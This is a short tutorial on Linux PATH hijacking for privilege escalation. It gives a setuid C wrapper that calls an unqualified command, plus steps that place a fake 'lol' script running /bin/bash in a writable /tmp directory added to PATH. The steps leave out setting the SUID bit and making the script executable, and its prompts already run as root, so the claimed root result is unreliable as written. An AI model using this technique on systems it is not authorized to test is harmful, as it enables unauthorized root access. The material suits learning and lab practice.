If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).

Typically the PATH will look like this:
```
root@ubuntu:/home/elgazzar/tools# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

If we type “lol” to the command line, these are the locations Linux will look in for an executable called lol. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?

>the main idea is creating a compileable script runnig spasfic command (ex, lol) and modify the ```PATH``` variable to include our directory that contain our compileable script that runnig our command (lol).

STEPS
--
1. Creat our script `path.c`:
```
#include <unistd.h>
void main(){
  setuid(0);
  setgid(0);
  system("lol");
}
```
2. In order to make it excutable:
```
gcc path.c -o path -w
```
>NOTE >>> if we write ```lol``` in the terminal, we will get an error indicating the command not found.

3. We add a writable directory within the `PATH` variable (for example, ```/tmp```)
```
export PATH=$PATH:/tmp
```
So the PATH variable will look like this:
```
root@ubuntu:/home/elgazzar/tools# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/tmp
```

4. Go to the `/tmp` to creat our file named `lol` and add to it `/bin/bash`:
```
$ cat lol
/bin/bash
```
5. Go to the excutable ```path``` file and run it:
```
./path
```
Finally, we got the root access.










